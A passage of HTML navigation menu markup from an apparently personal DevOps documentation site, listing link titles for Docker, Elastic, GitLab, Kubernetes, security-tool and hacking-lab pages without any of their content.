            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12">
            <span class="md-nav__icon md-icon"></span>
            Dockers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/%23%20Full%20Environment%20dockerized/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Full Environment dockerized
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/ALG-Nvidia/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1 Install Nvidia Drivers
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/Advanced%20Security%20Features%20of%20Docker%20and%20Kubernetes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Advanced Security Features of Docker and Kubernetes
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/BuildArgs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker build with --build-arg with multiple arguments from file
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/Dockers%20Best%20Practices/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dockers Best Practices
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/GPUDocker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Turn on GPU access with Docker Compose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/algDocs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vanilla Ubuntu setup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/containerRegistry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    containerRegistry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/deaemonExpose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    How to Connect to a Remote Docker Daemon
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/docker-cheatsheet-RafaBTS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DOCKER
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/docker-compose-network/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker compose network
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/dockerBestTolls/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dockerBestTolls
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/dockerLabs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DockerLabs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/dockerRegistry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dockerRegistry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/imageDebug/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    imageDebug
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/instalDockerCompose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    instalDockerCompose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/macOsDocker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    macOsDocker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dockers/removeImages/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    removeImages
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
        
          
          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Dozzle(docker logs)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_13">
            <span class="md-nav__icon md-icon"></span>
            Dozzle(docker logs)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dozzle%28docker%20logs%29/Dozzle/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Getting Started
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dozzle%28docker%20logs%29/checkMK/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Installation as a Docker container
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dozzle%28docker%20logs%29/glaces/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dozzle%28docker%20logs%29/zabbix/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Zabbix
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
        
          
          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Duplicatti
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_14">
            <span class="md-nav__icon md-icon"></span>
            Duplicatti
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Duplicatti/compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Compose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Duplicatti/duplicattiDocumentation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    duplicattiDocumentation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Duplicatti/mailSend/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    mailSend
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
        
          
          <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Elastic
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_15">
            <span class="md-nav__icon md-icon"></span>
            Elastic
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/Cartier%20Eslastic%20%26%20Kibana/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cartier Eslastic &amp; Kibana
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/ElasticKibanaCompose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ElasticKibanaCompose
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/ElasticKibanaComposeCustom/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ElasticKibanaComposeCustom
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/RsyslogKibana/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Monitoring Linux Logs with Kibana and Rsyslog
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/composeElasKib/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    composeElasKib
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/dumpElastic/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    dumpElastic
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/metricbeats/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MetricBeats Setup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15_8" >
        
          
          <label class="md-nav__link" for="__nav_15_8" id="__nav_15_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Elastalert+config
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_15_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_15_8">
            <span class="md-nav__icon md-icon"></span>
            Elastalert+config
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Elastic/elastalert%2Bconfig/docker-compose/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Elastalert
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
        
          
          <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Email
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_16">
            <span class="md-nav__icon md-icon"></span>
            Email
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Email/posteio/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Posteio
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Email/spoofLab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Install spoof lab
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
        
          
          <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="">
            
  
  <span class="md-ellipsis">
    GCP
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_17">
            <span class="md-nav__icon md-icon"></span>
            GCP
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../GCP/buckets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Buckets
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
        
          
          <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Github
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_18">
            <span class="md-nav__icon md-icon"></span>
            Github
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Github/actionsCartier/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    actionsCartier
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Github/actionsCentex/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    actionsCentex
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Github/cloneAllRepos/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    cloneAllRepos
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Github/loginGhcr/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Login Docker registry
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
        
          
          <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Gitlab
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_19">
            <span class="md-nav__icon md-icon"></span>
            Gitlab
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/GitHubKeyssh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GitHubKeyssh
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/LFS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/autoTags/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tag your Git repo using Gitlab’s CI/CD pipeline
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/gitcommands-RafaBTS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    gitcommands RafaBTS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/gitcommands/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gitcommands
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/gitlabPackageRegistry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    gitlabPackageRegistry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/gitlabRunner/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gitlab Cheatsheet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/pipeExampleCartier/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pipeExampleCartier
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/pipeOverlay/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pipeOverlay
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitlab/pipelineExample/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pipelineExample
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
        
          
          <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Gitleaks
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_20">
            <span class="md-nav__icon md-icon"></span>
            Gitleaks
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gitleaks/Install/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Install
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
        
          
          <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Gotty(SSH)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_21">
            <span class="md-nav__icon md-icon"></span>
            Gotty(SSH)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Gotty%28SSH%29/gotty/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GoTTY - Share your terminal as a web application
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
        
          
          <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Hacking
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_22">
            <span class="md-nav__icon md-icon"></span>
            Hacking
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/DockerTools/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DockerTools
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/Steps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Steps
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cheatsheet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/emailSpoof/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Spoof E-Mail Using SendEmail and Postfix
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/subfinder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subfinder
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/tools/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tools
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/webs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Webs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hacking/zap-proxy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ZAP - Webswing Usage
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
        
          
          <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="">
            
  
  <span class="md-ellipsis">
    HashicorpVault
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_23">
            <span class="md-nav__icon md-icon"></span>
            HashicorpVault
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../HashicorpVault/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vault Agent (Persistent) Docker Compose Setup
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
        
          
          <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Hetzner
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_24">
            <span class="md-nav__icon md-icon"></span>
            Hetzner
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Hetzner/RestoreRootPassw/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RestoreRootPassw
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
        
          
          <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Kind(k8s)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_25">
            <span class="md-nav__icon md-icon"></span>
            Kind(k8s)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Kind%28k8s%29/cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kubernetes KIND Cheat Sheet
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
        
          
          <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Kubernetes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_26">
            <span class="md-nav__icon md-icon"></span>
            Kubernetes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/Dockerfile-kube/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dockerfile kube
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/Ingress/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ingress
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/nginx-Conf-kube/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nginx Conf kube
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26_4" >
        
          
          <label class="md-nav__link" for="__nav_26_4" id="__nav_26_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Mybts
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_26_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_26_4">
            <span class="md-nav__icon md-icon"></span>
            Mybts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26_4_1" >
        
          
          <label class="md-nav__link" for="__nav_26_4_1" id="__nav_26_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Charts
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_26_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_26_4_1">
            <span class="md-nav__icon md-icon"></span>
            Charts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26_4_1_1" >
        
          
          <label class="md-nav__link" for="__nav_26_4_1_1" id="__nav_26_4_1_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Helm postgresql
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_26_4_1_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_26_4_1_1">
            <span class="md-nav__icon md-icon"></span>
            Helm postgresql
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/mybts/charts/helm-postgresql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Index
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26_4_1_1_2" >
        
          
          <label class="md-nav__link" for="__nav_26_4_1_1_2" id="__nav_26_4_1_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Charts
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_26_4_1_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_26_4_1_1_2">
            <span class="md-nav__icon md-icon"></span>
            Charts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26_4_1_1_2_1" >
        
          
          <label class="md-nav__link" for="__nav_26_4_1_1_2_1" id="__nav_26_4_1_1_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Common
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="6" aria-labelledby="__nav_26_4_1_1_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_26_4_1_1_2_1">
            <span class="md-nav__icon md-icon"></span>
            Common
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/mybts/charts/helm-postgresql/charts/common/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bitnami Common Library Chart
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
        
          
          <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="">
            
  
  <span class="md-ellipsis">
